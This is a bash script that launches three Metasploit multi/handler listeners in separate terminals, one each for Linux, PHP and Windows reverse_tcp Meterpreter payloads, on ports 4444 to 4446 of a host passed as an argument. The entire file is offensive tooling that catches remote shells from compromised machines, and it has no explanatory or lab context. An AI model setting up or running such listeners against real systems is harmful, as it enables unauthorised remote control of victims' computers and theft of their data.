#!/bin/bash
HOST=$1
gnome-terminal -t linux-meterpreter -x msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST=$HOST LPORT=4444 E
gnome-terminal -t php-meterpreter -x msfcli exploit/multi/handler PAYLOAD=php/meterpreter/reverse_tcp LHOST=$HOST LPORT=4445 E
gnome-terminal -t windows-meterpreter -x msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=4446 E
